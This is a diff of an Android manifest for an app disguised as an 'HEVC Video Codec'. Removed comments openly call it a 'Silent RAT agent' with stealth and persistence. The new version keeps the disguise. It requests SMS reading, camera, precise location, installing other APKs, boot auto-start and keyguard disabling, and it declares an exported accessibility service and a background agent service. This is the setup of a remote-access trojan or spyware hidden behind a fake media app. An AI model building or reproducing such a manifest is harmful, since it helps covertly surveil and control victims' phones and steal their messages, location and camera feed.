@@ -1,32 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Core -->
+    <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+
+    <!-- Install other APKs (API 26+) -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"
+        tools:ignore="ProtectedPermissions"/>
 
     <!-- Data collection -->
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.CAMERA"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
 
-    <!-- Stealth/persistence -->
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
+    <!-- Persistence -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
 
     <application
-        android:label="HEVC Video Codec"
-        android:icon="@android:drawable/ic_media_play"
         android:allowBackup="false"
-        android:theme="@style/Theme.HevcCodec">
+        android:icon="@mipmap/ic_launcher"
+        android:label="HEVC Video Codec"
+        android:theme="@style/Theme.AppCompat.NoActionBar"
+        android:usesCleartextTraffic="true"
+        tools:targetApi="m">
 
-        <!-- Front face: video player -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -36,35 +41,10 @@
             </intent-filter>
         </activity>
 
-        <!-- Silent RAT agent -->
-        <service
-            android:name=".AgentService"
-            android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="mediaPlayback|dataSync"/>
-
-        <!-- Boot auto-start -->
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED"/>
-                <action android:name="android.intent.action.USER_PRESENT"/>
-            </intent-filter>
-        </receiver>
-
-        <!-- Watchdog -->
-        <service
-            android:name=".WatchdogJob"
-            android:permission="android.permission.BIND_JOB_SERVICE"
-            android:exported="false"/>
-
-        <!-- Accessibility: detect when user opens watched apps -->
-        <service
-            android:name=".AgentAccessibilityService"
+        <service android:name=".AgentService" android:foregroundServiceType="dataSync"/>
+        <service android:name=".AgentAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="false">
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService"/>
             </intent-filter>
@@ -72,5 +52,11 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_config"/>
         </service>
+
+        <receiver android:name=".BootReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
     </application>
 </manifest>
